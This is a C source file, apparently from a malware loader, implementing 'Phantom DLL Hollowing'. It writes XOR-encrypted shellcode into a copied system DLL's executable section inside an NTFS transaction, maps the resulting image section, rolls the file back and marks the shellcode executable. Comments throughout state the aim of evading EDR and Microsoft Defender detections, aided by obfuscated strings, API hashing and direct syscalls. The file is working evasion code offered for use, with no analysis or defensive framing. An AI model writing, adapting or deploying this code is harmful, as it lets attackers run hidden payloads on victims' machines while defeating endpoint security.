// =============================================
// Phantom.c - Phantom DLL Hollowing (NTFS Transactions)
// =============================================
//
// Creates a transacted copy of a sacrificial DLL,
// overwrites the .text section with shellcode in
// the transaction, creates an image section from
// the modified file, then rolls back the transaction.
//
// The section retains the modified content but the
// on-disk file is unchanged. EDR that compares
// memory to the backing file sees no mismatch
// because the section's FILE_OBJECT has the
// transacted (modified) data.
//
// Requires write access to the DLL file path.
// Falls back gracefully if permissions are insufficient.
// =============================================

#include "Common.h"

// -----------------------------------------------
// Phantom DLL Hollowing entry point.
// Uses a goto-cleanup pattern: hTx / hFile / hSection
// are sentinel-initialized; each is reset after early
// in-flow close so the cleanup label only fires on
// genuinely open handles.
// -----------------------------------------------
BOOL PhantomDllHollow(
    IN  PAPI_HASHING pApi,
    IN  PNTAPI_FUNC  pNtApis,
    IN  PBYTE        pShellcode,
    IN  DWORD        dwShellcodeSize,
    OUT PVOID*       ppExecAddr
) {
    BOOL     bSuccess = FALSE;
    HANDLE   hTx      = INVALID_HANDLE_VALUE;
    HANDLE   hFile    = INVALID_HANDLE_VALUE;
    HANDLE   hSection = NULL;
    NTSTATUS STATUS   = 0;

    // pRollback resolved later; need a sentinel for cleanup label
    fnRollbackTransaction pRollback = NULL;
    // pCloseHandle resolved later; cleanup needs it too
    fnCloseHandle2        pCloseHandle = NULL;

    if (!pApi || !pNtApis || !pShellcode || !ppExecAddr || dwShellcodeSize == 0)
        goto cleanup;

    // --- Resolve kernel32 base ---

    BYTE xK32[] = XSTR_KERNEL32_DLL;
    DEOBF(xK32);
    HMODULE hK32 = pApi->pGetModuleHandleA((LPCSTR)xK32);
    if (!hK32)
        goto cleanup;

    // --- Resolve all needed APIs ---

    fnReadFile pReadFile = (fnReadFile)FetchExportAddress((PVOID)hK32, ReadFile_JOAAT);
    fnWriteFile2 pWriteFile = (fnWriteFile2)FetchExportAddress((PVOID)hK32, WriteFile_JOAAT);
    fnSetFilePointer pSetFilePointer = (fnSetFilePointer)FetchExportAddress((PVOID)hK32, SetFilePointer_JOAAT);
    pCloseHandle = (fnCloseHandle2)FetchExportAddress((PVOID)hK32, CloseHandle_JOAAT);
    if (!pReadFile || !pWriteFile || !pSetFilePointer || !pCloseHandle)
        goto cleanup;

    BYTE xCreateFileTx[] = XSTR_CREATE_FILE_TXA;
    DEOBF(xCreateFileTx);
    fnCreateFileTransactedA pCreateFileTx =
        (fnCreateFileTransactedA)pApi->pGetProcAddress(hK32, (LPCSTR)xCreateFileTx);

    BYTE xGetTemp[] = XSTR_GET_TEMP_PATH_A;
    DEOBF(xGetTemp);
    fnGetTempPathA2 pGetTempPath = (fnGetTempPathA2)pApi->pGetProcAddress(hK32, (LPCSTR)xGetTemp);

    BYTE xCopyFile[] = XSTR_COPY_FILE_A;
    DEOBF(xCopyFile);
    fnCopyFileA2 pCopyFile = (fnCopyFileA2)pApi->pGetProcAddress(hK32, (LPCSTR)xCopyFile);

    if (!pCreateFileTx || !pGetTempPath || !pCopyFile)
        goto cleanup;

    // --- Pick sacrificial DLL from allowlist (P1-C). Replaces previous
    //     "scan all of System32" logic to (a) avoid Defender-reputation-
    //     flagged DLLs like aadauthhelper.dll / amd_comgr.dll that previously
    //     showed up in Defender's Behavior:Win32/Meterpreter.gen detections
    //     on transactionfile resources, and (b) restrict to low-sensitivity
    //     multimedia/debug categories. ---

    BYTE xPrefix[] = XSTR_SYS32_PREFIX;
    DEOBF(xPrefix);
    SIZE_T nPre = StrLenA((LPCSTR)xPrefix);

    CHAR szChosenDll[260] = { 0 };
    CHAR szSrcPath[260]   = { 0 };

    if (!PickSacrificialDll(pApi, dwShellcodeSize, szChosenDll, szSrcPath)) {
        LOG("[!] Phantom: no allowlisted DLL fits shellcode");
        goto cleanup;
    }
    SIZE_T nDll = StrLenA(szChosenDll);
    LOG("[+] Phantom: selected DLL from allowlist");

    CHAR szPath[260];
    MemSet(szPath, 0, sizeof(szPath));
    DWORD dwTempLen = pGetTempPath(sizeof(szPath), szPath);
    if (dwTempLen == 0)
        goto cleanup;
    MemCopy(szPath + dwTempLen, szChosenDll, nDll);

    if (!pCopyFile(szSrcPath, szPath, FALSE)) {
        LOG("[!] Phantom: CopyFile to temp failed");
        goto cleanup;
    }
    LOG("[+] Phantom: DLL copied to temp");

    // --- Load ktmw32.dll and resolve TxF APIs ---

    BYTE xKtm[] = XSTR_KTMW32_DLL;
    DEOBF(xKtm);
    HMODULE hKtm = pApi->pLoadLibraryA((LPCSTR)xKtm);
    if (!hKtm)
        goto cleanup;

    BYTE xCreateTx[] = XSTR_CREATE_TRANSACTION;
    DEOBF(xCreateTx);
    fnCreateTransaction pCreateTx =
        (fnCreateTransaction)pApi->pGetProcAddress(hKtm, (LPCSTR)xCreateTx);
    if (!pCreateTx)
        goto cleanup;

    BYTE xRollback[] = XSTR_ROLLBACK_TRANSACTION;
    DEOBF(xRollback);
    pRollback = (fnRollbackTransaction)pApi->pGetProcAddress(hKtm, (LPCSTR)xRollback);
    if (!pRollback)
        goto cleanup;

    // --- Create transaction ---

    hTx = pCreateTx(NULL, NULL, 0, 0, 0, 0, NULL);
    if (hTx == INVALID_HANDLE_VALUE) {
        LOG("[!] Phantom: CreateTransaction failed");
        goto cleanup;
    }

    // --- Open DLL file within the transaction (read + write) ---

    hFile = pCreateFileTx(
        szPath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTx,
        NULL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        LOG("[!] Phantom: CreateFileTransacted failed (permissions?)");
        goto cleanup;
    }

    LOG("[+] Phantom: transacted file opened");

    // --- Read PE headers from the transacted file ---
    // We need to find the .text section's PointerToRawData and VirtualAddress

    BYTE peHeader[1024];
    DWORD dwBytesRead = 0;
    if (!pReadFile(hFile, peHeader, sizeof(peHeader), &dwBytesRead, NULL))
        goto cleanup;

    PIMAGE_NT_HEADERS pNt = NULL;
    if (!ValidatePeHeadersBounded(peHeader, dwBytesRead, &pNt))
        goto cleanup;

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    DWORD dwTextRawOffset = 0;
    DWORD dwTextRawSize   = 0;
    DWORD dwTextVA        = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            dwTextRawOffset = pSec[i].PointerToRawData;
            dwTextRawSize   = pSec[i].SizeOfRawData;
            dwTextVA        = pSec[i].VirtualAddress;
            break;
        }
    }

    if (dwTextRawSize < dwShellcodeSize) {
        LOG("[!] Phantom: .text too small for shellcode");
        goto cleanup;
    }

    // --- Seek to .text section's raw data offset ---

    pSetFilePointer(hFile, (LONG)dwTextRawOffset, NULL, 0 /*FILE_BEGIN*/);

    // --- (P2-E) XOR shellcode in place before writing to transacted file ---
    //
    // Defender's MpFilter.sys reads transactional file views during the
    // transaction window (this is what produced the previous
    // `Behavior:Win32/Meterpreter.gen` alerts on transactionfile resources).
    // Writing encrypted bytes makes the in-transaction view byte-pattern-
    // free; section creation still succeeds because SEC_IMAGE doesn't
    // validate .text content, only PE header layout. After mapping we
    // flip protection to RW, XOR-decrypt in place, and flip back to RX/RWX.
    //
    // pShellcode is the loader's decrypted+decompressed buffer — we mutate
    // it directly. The caller frees it after placement; the buffer dies
    // either way so encryption is safe to do in place.
    BYTE phantomKey[] = INIT_PLACEMENT_XOR_KEY;
    XorBufferInPlace(pShellcode, dwShellcodeSize, phantomKey, PLACEMENT_XOR_KEY_LEN);

    DWORD dwWritten = 0;
    BOOL bWrote = pWriteFile(hFile, pShellcode, dwShellcodeSize, &dwWritten, NULL);

    // Undo the in-place XOR on the heap buffer immediately so subsequent
    // fallback paths (ModuleStomp, NtAllocate) see the plaintext shellcode
    // if Phantom fails downstream.
    XorBufferInPlace(pShellcode, dwShellcodeSize, phantomKey, PLACEMENT_XOR_KEY_LEN);

    if (!bWrote || dwWritten != dwShellcodeSize) {
        LOG("[!] Phantom: WriteFile failed");
        goto cleanup;
    }

    LOG("[+] Phantom: encrypted shellcode written to transacted .text");

    // --- Create image section from the transacted file ---
    // The section sees the modified content (with our shellcode)

    SET_SYSCALL(pNtApis->NtCreateSection);
    STATUS = RunSyscall(
        (ULONG_PTR)&hSection,
        (ULONG_PTR)0x000F001F,     // SECTION_ALL_ACCESS
        (ULONG_PTR)0,              // NULL ObjectAttributes
        (ULONG_PTR)0,              // NULL MaximumSize (file-backed)
        (ULONG_PTR)PAGE_READONLY,
        (ULONG_PTR)0x01000000,     // SEC_IMAGE
        (ULONG_PTR)hFile,
        0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtCreateSection failed", STATUS);
        goto cleanup;
    }

    // --- Close file handle (section holds its own reference) ---
    pCloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    // --- Rollback transaction: on-disk file is unchanged ---
    // The section retains the modified content
    pRollback(hTx);
    pCloseHandle(hTx);
    hTx = INVALID_HANDLE_VALUE;
    LOG("[+] Phantom: transaction rolled back (file clean)");

    // --- Map the section into our process ---

    PVOID  pBase    = NULL;
    SIZE_T viewSize = 0;
    SET_SYSCALL(pNtApis->NtMapViewOfSection);
    STATUS = RunSyscall(
        (ULONG_PTR)hSection,
        (ULONG_PTR)(HANDLE)-1,     // Current process
        (ULONG_PTR)&pBase,
        (ULONG_PTR)0,              // ZeroBits
        (ULONG_PTR)0,              // CommitSize
        (ULONG_PTR)0,              // SectionOffset = NULL
        (ULONG_PTR)&viewSize,
        (ULONG_PTR)1,              // ViewShare
        (ULONG_PTR)0,              // AllocationType
        (ULONG_PTR)PAGE_READONLY,
        0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtMapViewOfSection failed", STATUS);
        goto cleanup;
    }

    // Section handle no longer needed after mapping
    pCloseHandle(hSection);
    hSection = NULL;

    // --- Flip to RW, XOR-decrypt in place, flip to final exec protection ---
    //
    // SEC_IMAGE maps .text as PAGE_EXECUTE_READ (or RX with CET shadow stack).
    // To decrypt the shellcode we wrote encrypted, we need a brief RW window.

    PVOID  pTextAddr  = (PVOID)((PBYTE)pBase + dwTextVA);
    SIZE_T sProtSize  = (SIZE_T)dwShellcodeSize;
    ULONG  dwOldProt  = 0;

    SET_SYSCALL(pNtApis->NtProtectVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pTextAddr,
        (ULONG_PTR)&sProtSize,
        (ULONG_PTR)PAGE_READWRITE,
        (ULONG_PTR)&dwOldProt,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtProtectVirtualMemory(RW) failed", STATUS);
        goto cleanup;
    }

    // Decrypt the encrypted shellcode we wrote into the section.
    {
        BYTE phantomKey2[] = INIT_PLACEMENT_XOR_KEY;
        XorBufferInPlace((PBYTE)pTextAddr, dwShellcodeSize,
                         phantomKey2, PLACEMENT_XOR_KEY_LEN);
        // Wipe key from stack
        MemSet(phantomKey2, 0, sizeof(phantomKey2));
    }

    // Reset for the second NtProtectVirtualMemory call (RW -> RX/RWX)
    pTextAddr = (PVOID)((PBYTE)pBase + dwTextVA);
    sProtSize = (SIZE_T)dwShellcodeSize;
    dwOldProt = 0;

    SET_SYSCALL(pNtApis->NtProtectVirtualMemory);
    STATUS = RunSyscall(
        (ULONG_PTR)(HANDLE)-1,
        (ULONG_PTR)&pTextAddr,
        (ULONG_PTR)&sProtSize,
        (ULONG_PTR)SHELLCODE_EXEC_PROT,
        (ULONG_PTR)&dwOldProt,
        0, 0, 0, 0, 0, 0, 0
    );
    if (!NT_SUCCESS(STATUS)) {
        LOG_STATUS("[!] Phantom: NtProtectVirtualMemory(exec) failed", STATUS);
        goto cleanup;
    }

    *ppExecAddr = (PVOID)((PBYTE)pBase + dwTextVA);
    LOG("[+] Phantom DLL hollowing: shellcode mapped + decrypted in place");
    bSuccess = TRUE;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE && pCloseHandle)
        pCloseHandle(hFile);
    if (hTx != INVALID_HANDLE_VALUE && pCloseHandle) {
        if (pRollback) pRollback(hTx);
        pCloseHandle(hTx);
    }
    if (hSection != NULL && pCloseHandle)
        pCloseHandle(hSection);
    return bSuccess;
}
